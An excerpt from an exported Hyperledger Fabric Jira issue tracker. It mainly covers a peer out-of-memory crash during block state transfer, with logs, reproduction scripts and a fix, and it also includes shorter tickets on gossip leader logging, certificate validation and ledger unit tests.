 # We turned on gossip debug logs and could see the peer requesting 10 blocks at a time from neighboring peers and gradually trying to ""catch up"" its ledger closer to the size of the existing peers. (As expected, we do not see any logs saying ""cannot enqueue block with sequence of"", because the inflow of blocks to the new peer is only in groups of 10 at a time, as requested by the peer itself. A different test, when a peer joins and becomes an orgleader and connects to an orderer, produces different behavior which makes use of the ""blocking"" solution of FAB-5793.)
 # The new peer spontaneously resets, without any error logs in the peer container logs, after about 10 mins after joining new peer.

+Observations+
 * It appears to be a memory exhaustion problem.
 * It happened quickly.
 * It can be reproduced every attempt.
 * We tried configuring the ""newly joining peer"" on different host, and observed same problem.
 * And, when joining peer as an orgleader, we saw it happen once or twice in about 11 attempts.
 * We executed ""top"" in the host which contained docker containers for this new peer as well as a few others, and we noticed +CPU usage > 100%+ and noticed +memory usage climbing quickly past 50% and above 90% after 3 minutes.+ We captured some other linux system logs too.

{code:java}
top - 14:46:20 up 51 days, 4:27, 1 user, load average: 4.88, 3.69, 2.76
 Tasks: 196 total, 4 running, 192 sleeping, 0 stopped, 0 zombie
 %Cpu(s): 32.9 us, 30.2 sy, 0.0 ni, 31.8 id, 3.8 wa, 0.0 hi, 1.3 si, 0.0 st
 KiB Mem : 8175024 total, 156032 free, 7795564 used, 223428 buff/cache
 KiB Swap: 4194300 total, 1944476 free, 2249824 used. 98044 avail Mem

PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 
 18027 root 20 0 9584564 7.084g 5704 S 120.5 90.9 5:23.09 peer 
 1650 root 20 0 111756 436 352 R 99.7 0.0 27199:48 x11vnc 
 19591 root 20 0 2861080 53368 10508 S 16.9 0.7 433:22.16 dockerd 
 18008 root 20 0 421516 1992 0 S 6.0 0.0 0:18.76 docker-containe 
 44 root 20 0 0 0 0 S 4.3 0.0 1:27.28 kswapd0

{code}
Looking in file /var/log/kern.log , we saw:
{code:java}
 Aug 17 16:55:39 multihost15 kernel: [4430259.788325] Out of memory: Kill process 23925 (peer) score 931 or sacrifice child
 Aug 17 16:55:39 multihost15 kernel: [4430259.788338] Killed process 23925 (peer) total-vm:11930304kB, anon-rss:7676004kB, file-rss:0kB

{code}
Looking in file /var/log/syslog , we saw:
{code:java}
Aug 17 16:55:43 multihost15 dockerd[19591]: time=""2017-08-17T16:55:43.129099623-04:00"" level=error msg=""fatal task error"" error=""task: non-zero exit (137)"" module=""node/agent/taskmanager"" node.id=ziblrz0z5ntplqueaq7o3zqhp service.id=nmjcpxd55wj0k83u7qjn3i3n8 task.id=sbjyia9kduyrwrst7su2aeouh

{code}
 Here are the environment variables used for the lagging peer:
{code:java}
CORE_PEER_ADDRESSAUTODETECT=false \
CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock \
CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=basic \
CORE_LOGGING_LEVEL=ERROR \
CORE_PEER_TLS_ENABLED=true \
CORE_PEER_COMMITTER_ENABLED=true \
CORE_PEER_GOSSIP_ORGLEADER=false \
CORE_PEER_GOSSIP_USELEADERELECTION=false \
CORE_PEER_PROFILE_ENABLED=true \
CORE_PEER_ADDRESS=peer2.org1.example.com:7051 \
CORE_PEER_ID=peer2.org1.example.com \
CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/fabric/msp \
CORE_PEER_LOCALMSPID=Org1MSP \
CORE_PEER_GOSSIP_BOOTSTRAP=peer0.org1.example.com:7051 \
CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt \
CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key \
CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt \
{code}
 ",,C0rWin,muralisr,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Sep/17 4:55 AM;suryalnvs;5849.tar.gz;https://jira.hyperledger.org/secure/attachment/12119/5849.tar.gz","21/Aug/17 10:48 PM;suryalnvs;fail_peer.log;https://jira.hyperledger.org/secure/attachment/11916/fail_peer.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydon:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,muralisr,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Aug/17 10:49 PM;suryalnvs;Attached the lagging peer log;;;","28/Aug/17 11:17 PM;yacovm;Hi.

Can this be reproduced with using solely docker-compose? Can you please provide an adequate docker-compose file and a script that reproduces the problem?;;;","29/Aug/17 4:41 AM;suryalnvs;[~yacovm] We are using multihost setup using docker swarm. We do not use any docker-compose file for this setup. 

For more details, you can refer https://github.com/suryalnvs/multihost_swarm_1.0.1/

Please let me know, if you need more information.  ;;;","29/Aug/17 5:52 AM;yacovm;OK, assuming I install these [prerequisites|https://github.com/suryalnvs/startup_scripts/blob/master/setup_prereq.sh] for docker-swarm, can you please provide me with a script that if I run it (on a single VM) - I can reproduce the problem? ;;;","06/Sep/17 8:16 PM;C0rWin;> Establish a network using docker swarm with multihost configuration. Refer to attached configuration files.

Can you please attach those files, since only attachment I can see is the errors logs file. ;;;","07/Sep/17 12:25 AM;scottz;[~C0rWin]  Note Surya provided a link to the files:  you can refer [https://github.com/suryalnvs/multihost_swarm_1.0.1/] where you can see how the peers are configured on the multiple hosts.

I suppose one could also try reproducing on a single host, without using swarm. I would suggest reducing other factors as much as possible, such as using solo orderer and just 2 peers in one org (and create and join the second peer as a nonleader only AFTER you executed 20000 transactions on the first). We did not try to reproduce it that way, but it might be sufficient for debugging the problem.;;;","07/Sep/17 4:45 AM;yacovm;{quote}I suppose one could also try reproducing on a single host, without using swarm. I would suggest reducing other factors as much as possible, such as using solo orderer and just 2 peers in one org (and create and join the second peer as a nonleader only AFTER you executed 20000 transactions on the first). We did not try to reproduce it that way, but it might be sufficient for debugging the problem.{quote}

Thanks for the tips, Scott.
Ruling out factors that don't effect the problem helps zooming in on the problem itself. 
Can you perhaps help [~suryalnvs] with providing us a script that reproduces the bug? ;;;","08/Sep/17 2:32 AM;muralisr;[~scottz] just following on [~yacovm] request above... did we provide a script to isolate / recreate ?;;;","08/Sep/17 4:33 AM;scottz;[~suryalnvs] is trying to develop a script that runs on a single machine and retest. Then he will share it.;;;","13/Sep/17 4:26 AM;suryalnvs;I was able to reproduce this issue and attaching the tar file for the docker-compose which launches the network on a single machine. untar the docker-compose.tar.gz and run the following command from fabric-docker-compose-svt directory.
{code:java}
./network_setup.sh -s -f docker-compose-e2e.yaml {code}
and used PTE tool to do the create, join, install, instantiate and sending invokes.

Launched the network, created the channel, joined only peer0.org1.example.com to the channel, installed and instantiated the chaincode. Waited for accumulating around 8000 blocks and then joined the peer1.org1.example.com, then observed the crash after some time(around 5 to 7 minutes).

 ;;;","15/Sep/17 10:31 PM;yacovm;I don't see such a file named network_launch.sh in the tar.gz file.

Is it possible that you provide a script that performs the instructions you listed to produce the problem? ;;;","15/Sep/17 10:56 PM;suryalnvs;[~yacovm] Apologies, it is network_setup.sh, I updated the command in my previous comment as well.

Sure, I will work on it and will update with a single script to perform all the steps to this bug.;;;","16/Sep/17 5:03 AM;suryalnvs;[~yacovm] I have attached 5849.tar.gz with all the necessary compose files and PTE tool to drive the test. Untar the file and run the follow command which does start the network, create the channel, join peer0.org1.example.com to channel, install and instantiate the chaincode, and then launch a longrun of invokes on peer0.org1.example.com for about 6 hrs (to generate the huge number of blocks).
{code:java}
./5849_replication.sh -m up 
{code}
Then join the 2nd peer of org1 to channel by running the following command
{code:java}
./5849_replication.sh -m join
{code}
To repeat the process of rejoining the peer1.org1.example.com to channel, you can use the above the command which does killing the peer1.org1.example.com, restarts it and then joins the peer to channel.

To remove the network, run the following the command
{code:java}
./5849_replication.sh -m down
{code}
Please let me know, if you any have any questions.;;;","16/Sep/17 11:25 PM;yacovm;you have any idea what I need to do to make it work? 

{code}
Launching the network
WARNING: The ENABLE_TLS variable is not set. Defaulting to a blank string.
Removing network fabricdockercomposesvt_default
WARNING: Network fabricdockercomposesvt_default not found.
---- No containers available for deletion ----
---- No images available for deletion ----
mychannel

Using cryptogen -> /opt/gopath/src/github.com/hyperledger/fabric/build/bin/cryptogen

##########################################################
##### Generate certificates using cryptogen tool #########
##########################################################
org1.example.com
org2.example.com

Using configtxgen -> /opt/gopath/src/github.com/hyperledger/fabric/build/bin/configtxgen
##########################################################
#########  Generating Orderer Genesis block ##############
##########################################################
2017-09-16 09:43:47.251 EDT [common/tools/configtxgen] main -> INFO 001 Loading configuration
2017-09-16 09:43:47.283 EDT [common/tools/configtxgen] doOutputBlock -> INFO 002 Generating genesis block
2017-09-16 09:43:47.284 EDT [common/tools/configtxgen] doOutputBlock -> INFO 003 Writing genesis block

#################################################################
### Generating channel configuration transaction 'channel.tx' ###
#################################################################
2017-09-16 09:43:47.304 EDT [common/tools/configtxgen] main -> INFO 001 Loading configuration
2017-09-16 09:43:47.308 EDT [common/tools/configtxgen] doOutputChannelCreateTx -> INFO 002 Generating new channel configtx
2017-09-16 09:43:47.308 EDT [common/tools/configtxgen] doOutputChannelCreateTx -> INFO 003 Writing new channel tx

#################################################################
### Generating anchor peer update for Org1MSP/Org2MSP/Org3MSP ###
#################################################################
2017-09-16 09:43:47.327 EDT [common/tools/configtxgen] main -> INFO 001 Loading configuration
2017-09-16 09:43:47.330 EDT [common/tools/configtxgen] doOutputAnchorPeersUpdate -> INFO 002 Generating anchor peer update
2017-09-16 09:43:47.331 EDT [common/tools/configtxgen] doOutputAnchorPeersUpdate -> INFO 003 Writing anchor peer update
2017-09-16 09:43:47.350 EDT [common/tools/configtxgen] main -> INFO 001 Loading configuration
2017-09-16 09:43:47.354 EDT [common/tools/configtxgen] doOutputAnchorPeersUpdate -> INFO 002 Generating anchor peer update
2017-09-16 09:43:47.354 EDT [common/tools/configtxgen] doOutputAnchorPeersUpdate -> INFO 003 Writing anchor peer update


Creating network ""fabricdockercomposesvt_default"" with the default driver
Creating zookeeper0
Creating peer0.org1.example.com
Creating zookeeper2
Creating zookeeper1
Creating ca_peerOrg1
Creating peer0.org2.example.com
Creating peer1.org2.example.com
Creating ca_peerOrg2
Creating peer1.org1.example.com
Creating kafka3
Creating kafka0
Creating kafka1
Creating kafka2
Creating orderer1.example.com
Creating orderer0.example.com
Creating orderer2.example.com
Error: No such container: cli
Installing node modules for fabric-sdk-node
fabric-sdk-node@1.0.2 /home/ibmadmin/5849/fabric-sdk-node
├── node-pre-gyp@0.6.36
└── singly-linked-list@0.2.7  extraneous

npm WARN optional Skipping failed optional dependency /chokidar/fsevents:
npm WARN notsup Not compatible with your operating system or architecture: fsevents@1.1.2
fabric-sdk-node@1.0.2 /home/ibmadmin/5849/fabric-sdk-node
├── node-pre-gyp@0.6.36
└── singly-linked-list@0.2.7  extraneous

npm WARN optional Skipping failed optional dependency /chokidar/fsevents:
npm WARN notsup Not compatible with your operating system or architecture: fsevents@1.1.2
[09:44:29] Working directory changed to ~/5849/fabric-sdk-node

####################################################
# debug log: /tmp/hfc/test-log/debug.log
####################################################

/home/ibmadmin/5849/fabric-sdk-node/build/tasks/watch.js:6
let gulp = require('gulp'),
^^^

SyntaxError: Block-scoped declarations (let, const, function, class) not yet supported outside strict mode
    at exports.runInThisContext (vm.js:53:16)
    at Module._compile (module.js:374:25)
    at Object.Module._extensions..js (module.js:417:10)
    at Module.load (module.js:344:32)
    at Function.Module._load (module.js:301:12)
    at Module.require (module.js:354:17)
    at require (internal/module.js:12:17)
    at requireDir (/home/ibmadmin/5849/fabric-sdk-node/node_modules/require-dir/index.js:123:33)
    at Object.<anonymous> (/home/ibmadmin/5849/fabric-sdk-node/gulpfile.js:10:1)
    at Module._compile (module.js:410:26)
    at Object.Module._extensions..js (module.js:417:10)
    at Module.load (module.js:344:32)
    at Function.Module._load (module.js:301:12)
    at Module.require (module.js:354:17)
    at require (internal/module.js:12:17)
    at Liftoff.handleArguments (/home/ibmadmin/5849/fabric-sdk-node/node_modules/gulp/bin/gulp.js:116:3)
mkdir: cannot create directory ‘/opt/gopath/src/sample_cc’: File exists
==============Creating the channel==================
./pte_driver.sh inFile= userInputs/runCases-chan-create-TLS.txt, tStart=0 iPTE=0
sdk type supported: sdk=node
sdk type unknown: #sdk=node
sdk type unknown: #sdk=node
Node Array: userInputs/samplecc-chan1-create-TLS.json
executing 1 node requests
iPTE: 0, nInstances: 1, tStart: 1505569494285
execution: userInputs/samplecc-chan1-create-TLS.json
no python requests
no java requests
module.js:328
    throw err;
    ^

Error: Cannot find module '/home/ibmadmin/5849/fabric-sdk-node/node_modules/grpc/src/node/extension_binary/node-v46-linux-x64/grpc_node.node'
    at Function.Module._resolveFilename (module.js:326:15)
    at Function.Module._load (module.js:277:25)
    at Module.require (module.js:354:17)
    at require (internal/module.js:12:17)
    at Object.<anonymous> (/home/ibmadmin/5849/fabric-sdk-node/node_modules/grpc/src/node/src/grpc_extension.js:30:15)
    at Module._compile (module.js:410:26)
    at Object.Module._extensions..js (module.js:417:10)
    at Module.load (module.js:344:32)
    at Function.Module._load (module.js:301:12)
    at Module.require (module.js:354:17)
    at require (internal/module.js:12:17)
{code}
;;;","19/Sep/17 4:08 AM;suryalnvs;From the error, I think it is something to do with the node version. In my case, I tested the script on multiple machines with node version 6.9.5 and npm version 3.10.10 to make sure, it worked as expected.

We are working with Yacov in RocketChat,  we suggested the following to generate the blocks faster than given in the initial scripts and this may be useful for anybody who wants to reproduce faster.

Change the
{code:java}
""nProcPerOrg"": ""4""
{code}
to
{code:java}
""nProcPerOrg"": ""8""
{code} in 
{code:java}
 fabric-sdk-node/test/v1performance/userInputs/samplecc-chan1-longrun1-i-TLS.json
{code}
and then restart the test.;;;","23/Sep/17 10:41 PM;yacovm;I ran the PTE as you advised and generated 8000 blocks:

 
{code:java}
docker logs -f peer0.org1.example.com 2>&1 | grep ""Created""

2017-09-23 13:04:29.623 UTC [gossip/state] commitBlock -> DEBU 310d5 Channel [mychannel]: Created block [8005] with 100 transaction(s)
2017-09-23 13:04:30.239 UTC [kvledger] CommitWithPvtData -> INFO 310ee Channel [mychannel]: Created block [8006] with 100 transaction(s)
2017-09-23 13:04:30.251 UTC [gossip/state] commitBlock -> DEBU 310f0 Channel [mychannel]: Created block [8006] with 100 transaction(s)
2017-09-23 13:04:32.320 UTC [kvledger] CommitWithPvtData -> INFO 3111c Channel [mychannel]: Created block [8007] with 93 transaction(s)
2017-09-23 13:04:32.327 UTC [gossip/state] commitBlock -> DEBU 3111e Channel [mychannel]: Created block [8007] with 93 transaction(s)
{code}
 

Next I executed the join: *./5849_replication.sh -m join*
{code:java}
info: [PTE 0 main]: [joinChannel] Successfully joined peers in (mychannel:Org1MSP)
{code}
 

Now I tracked the logs of *peer1.org1.example.com* and it was replicating blocks from peer0.org1.example.com in a speed of 5 blocks per second.

After about 700 blocks, linux killed it:
{quote}[2597959.961461] Memory cgroup out of memory: Kill process 6044 (peer) score 526 or sacrifice child
 [2597959.961467] Killed process 6044 (peer) total-vm:3745532kB, anon-rss:2095428kB, file-rss:8424kB
{quote}
 

I think this happens because although the state transfer attempts to fetch from a peer 10 blocks at a time, it does so repeatedly for all the missing blocks it has (8000) and the blocks are simply enqueued in the payload buffer.

Now, the problem here is that the commit is much slower than state transfer so we have a process (state transfer) that pours blocks into the payload buffer in a much higher rate than the process that consumes the payload buffer (the commit of the blocks and especially their validation, which is (still) single-threaded and involves expensive crypto computations)) so the payload buffer piles up and eventually the memory explodes.

I uploaded a fix:

[https://gerrit.hyperledger.org/r/#/c/13763/]

1)  Do you want to check and see if it fixes it? 

2) Thanks a lot for the find!;;;","24/Sep/17 8:21 PM;yacovm;BTW I tested it and I think it works:

Peer1 is catching up while peer0 is still receiving blocks:
{code:java}
2017-09-24 11:18:52.764 UTC [gossip/state] commitBlock -> DEBU 7943 Channel [mychannel]: Created block [1343] with 100 transaction(s)
2017-09-24 11:18:52.957 UTC [kvledger] CommitWithPvtData -> INFO 794b Channel [mychannel]: Created block [1344] with 100 transaction(s)
2017-09-24 11:18:52.977 UTC [gossip/state] commitBlock -> DEBU 7956 Channel [mychannel]: Created block [1344] with 100 transaction(s)
2017-09-24 11:18:53.228 UTC [kvledger] CommitWithPvtData -> INFO 795e Channel [mychannel]: Created block [1345] with 100 transaction(s)
2017-09-24 11:18:53.235 UTC [gossip/state] commitBlock -> DEBU 7960 Channel [mychannel]: Created block [1345] with 100 transaction(s)
2017-09-24 11:18:53.410 UTC [kvledger] CommitWithPvtData -> INFO 797f Channel [mychannel]: Created block [1346] with 100 transaction(s)
2017-09-24 11:18:53.417 UTC [gossip/state] commitBlock -> DEBU 7981 Channel [mychannel]: Created block [1346] with 100 transaction(s)
2017-09-24 11:18:53.572 UTC [kvledger] CommitWithPvtData -> INFO 7989 Channel [mychannel]: Created block [1347] with 100 transaction(s)
2017-09-24 11:18:53.579 UTC [gossip/state] commitBlock -> DEBU 798b Channel [mychannel]: Created block [1347] with 100 transaction(s)
2017-09-24 11:18:53.828 UTC [kvledger] CommitWithPvtData -> INFO 799c Channel [mychannel]: Created block [1348] with 100 transaction(s)
{code}

{code}
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root     11785  0.9  0.1 477232  6760 ?        Ssl  05:26   1:03 peer node start --peer-defaultchain=false
root     12382 63.1 15.4 1496704 625160 ?      Rsl  05:26  71:38 peer node start --peer-defaultchain=false
root     12681  0.9  0.1 264232  7860 ?        Ssl  05:26   1:04 peer node start --peer-defaultchain=false
root     15650  7.1  0.1 429840  5372 ?        Ssl  05:28   7:58 chaincode -peer.address=peer0.org1.example.com:7052
root     16249 58.1 19.9 1413888 808964 ?      Ssl  07:12   4:22 peer node start --peer-defaultchain=false
{code}

The memory consumption of the peers is around 1.4GB which is what it's usually is.;;;","25/Sep/17 9:49 AM;suryalnvs;Thank you [~yacovm]. I will rerun the test with the fix and will update the result in here.;;;","28/Sep/17 9:53 PM;suryalnvs;Retested and working as expected without crashing with the fix.;;;",,,,,,,,,,,,,,,,,,,,
missing gossip logs for org leaders,FAB-5850,20301,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,scottz,scottz,20/Aug/17 12:39 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,06/Sep/17 8:14 PM,v1.0.1,,,,,fabric-gossip,fabric-peer,,,,,0,,,,,,,"Operations personnel need to be able to see which peers are gossip org leaders, and which are not - and when the change occurs. This information will aid in debugging efforts, as well as network configuration/setup because they might wish to assign more powerful servers as their orgleaders. We noticed there is a gossip related log at debug level saying ""Become a leader"" when a peer wins election and becomes a leader. This should be printed at the default level (it seems the gossip default mode is WARNING level).

In addition,we noticed in code there is a log ""Stop being a leader"", but we never saw this log during our tests. This needs to be printed when an orgleader abdicates to another peer. And this log should be printed at the default (WARNING) level too.  _(8/28 edit: we did finally see this log, when using appropriate configuration settings. But it is still only a DEBUG log, and should be printed at WARNING level.)_ 

In summary: please print a gossip log at default (warning) level in peer whenever peer becomes a leader or whenever peer stops being a leader.The other similar logs may remain at debug level (such as whenever a peer merely checks to see if IsLeader"").

Printing these logs as requested will also facilitate automation testing.",,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydov:",,,,,,,,,,,,,,,,,,,,,,,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 11:37 PM;yacovm;{quote}This should be printed at the default level (it seems the gossip default mode is WARNING level).{quote}

But this isn't a warning though. I don't agree with this statement that it should be printed in the default level. 
Do you want me to make it INFO?

{quote}Printing these logs as requested will also facilitate automation testing.{quote}
I don't see what's the issue with just grepping the lines from the log. If the log is in INFO then it shouldn't take more time 

{quote}In addition,we noticed in code there is a log ""Stop being a leader"", but we never saw this log during our tests. This needs to be printed when an orgleader abdicates to another peer. And this log should be printed at the default (WARNING) level too.{quote}
This isn't a warning though. I can make it info if you want. ;;;","29/Aug/17 12:47 AM;scottz;We requested WARNING because I do not know if INFO will be sufficient in some environments where they run at the ERROR or WARNING level.

However, I agree it seems to fit better architecturally into INFO level, so I think we can be satisfied with INFO for occasional config and operational logs.;;;","29/Aug/17 5:08 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12871/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"err The supplied identity is not valid, Verify() returned x509: certificate signed by unknown authority",FAB-5851,20302,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,pvrbharg,pvrbharg,20/Aug/17 9:22 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 7:03 AM,,,,,,fabric-crypto,,,,,,0,,,,,,,"I need help - I am trying to configure first-net tutorial to work with crypto-config that uses an external root with one intermediate CA. The configuration is customized for customer test sandbox environment - with FQDN and the customer provided CN names. We are also using same set of certificates for tlsca as well as ca (app) with both CA providers being same externally well known CA.

I can demo our issue in a webex and/or provide all details for you to look at.

At this point - I need help to progress my customer project as this issue is holding up their PoC pilot project. 

Here is the actual error message:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2017-08-19 17:35:55.211 UTC [main] main -> ERRO 001 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.abcd.com/users/Admin@org1.abcd.com/msp: err CA Certificate is not valid, (SN: 14347142274732774646150233778247550482) [Could not obtain certification chain, err The supplied identity is not valid, Verify() returned x509: certificate signed by unknown authority]
!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 ",,pvrbharg,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Aug/17 7:42 AM;pvrbharg;AMEX-DockerContainerLogs-Aug242017.zip;https://jira.hyperledger.org/secure/attachment/11944/AMEX-DockerContainerLogs-Aug242017.zip","24/Aug/17 5:03 AM;pvrbharg;FAB-5851DockerContainerLogs.zip;https://jira.hyperledger.org/secure/attachment/11930/FAB-5851DockerContainerLogs.zip","24/Aug/17 10:22 AM;pvrbharg;SKYTAPHosted-dockerContainerLogs4FabricSamplesFirst-networkJSONFormatedLogs.zip;https://jira.hyperledger.org/secure/attachment/11932/SKYTAPHosted-dockerContainerLogs4FabricSamplesFirst-networkJSONFormatedLogs.zip",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydp3:",,,,,,,,,,,,,,,,,,,,,,,pvrbharg,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Oct/17 7:03 AM;yacovm;I confirmed with !https://secure.gravatar.com/avatar/e7381069cbbc71b71b6b5cbdc289d40e?d=mm&s=24! BHARGAV PEREPA  that the issue no longer persists.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add additional unit tests for FAB-2960 for GetVersion(),FAB-5853,20306,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,denyeart,denyeart,21/Aug/17 3:31 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 5:26 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,GetVersion() was introduced in FAB-2960 and required additional unit test.,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydpz:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add additional unit tests for FAB-2960 for ApplyUpdates() scenarios,FAB-5854,20307,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,denyeart,denyeart,21/Aug/17 3:35 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,21/Nov/17 5:50 AM,,,,,,,,,,,,0,,,,,,,"Add unit tests for additional ApplyUpdates() scenarios:

1) If an individual update in the CouchDB bulk update fails, we fall back to one-by-one processing of the failed updates with SaveDoc().  This scenario needs additional unit tests.

2) Under the circumstance where the cache has already a few entries but not for all the updates (i.e., simulating blind writes scenario).",,chris.elder,denyeart,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydq7:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,chris.elder,denyeart,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Sep/17 3:18 AM;chris.elder;https://gerrit.hyperledger.org/r/#/c/12913/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add minor improvements to FAB-2960 for bulk updates (serviceability, readability, maintainability)",FAB-5855,20308,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,21/Aug/17 3:37 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Sep/17 12:25 AM,,,,,,,,,,,,0,,,,,,,"After reviewing -FAB-2960- I'd like to make some minor improvements for serviceability, readability, maintainability.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydqf:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Aug/17 1:15 PM;denyeart;https://gerrit.hyperledger.org/r/#/c/12631/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move ClearCachedVersions() from statecouchdb to txmgr (improve FAB-2960),FAB-5856,20309,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,denyeart,denyeart,21/Aug/17 3:44 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Sep/17 8:42 PM,,,,,,,,,,,,0,,,,,,,"See review comments at: https://gerrit.hyperledger.org/r/#/c/7715/11/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:

Please remove this line from here. This confuses here because, there is no context when the cache is loaded. In fact, because the cache will be loaded in txmgmt before calling validation, that would be a right place for clearing this as well.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydqn:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/17 8:42 PM;denyeart;Done in FAB-5867.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Redundent Users.Count setting in crypto-config.yaml for binary cryptogen,FAB-5857,20310,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,davidkhala,davidkhala,21/Aug/17 12:29 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,21/Aug/17 12:38 PM,v1.0.1,,,,,fabric-crypto,,,,,,0,build-system,,,,,,"I did some test on changing the config file and found that no matter what value I assign to the 'Users.Count' setting, only one admin folder is found under 'users' folder of specified org.
And even more, I could remove this 'Users' key with impacting nothing.
{code:java}
# ---------------------------------------------------------------------------
